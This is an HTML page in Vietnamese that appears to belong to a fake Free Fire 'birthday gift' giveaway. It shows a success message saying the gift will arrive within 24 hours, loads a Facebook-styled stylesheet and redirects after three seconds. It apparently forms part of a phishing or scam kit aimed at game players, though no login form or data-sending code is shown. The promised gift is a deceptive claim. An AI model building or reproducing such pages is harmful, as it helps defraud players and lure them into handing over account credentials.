

<!DOCTYPE html>
<html>
<head><base href="https://themxe.codeflow.store/7/">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<title>QUÀ TẶNG FREEFIRE</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/facebook.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
    
      <script>
            setTimeout(() => {
                redirect();
            }, 3000);
     </script>
     

	<div class="nguyenSection">
		<div class="headerBg">
			<h1><i>Free Fire</i></h1>
			<img src="ngMedia/top.png">
		</div>
		<div class="ngWrap">
		    <div class="banner">
		    Nhận Quà Sinh Nhật Free Fire
		    </div>
			<div class="dialog">
				<div class="dialogBg">
				<img src="ngMedia/untitled_design_6-sixteen_nine.jpg">
				</div>
			</div>

<div class="mask"></div>
<div class="checkId">
		    <span class="titleText"> Nhận Quà Thành Công!! </span>
		  </br>  
		  <span class="nongvannguyen"> Quà sẽ được gửi đến sau 24h</span>
		</div>
 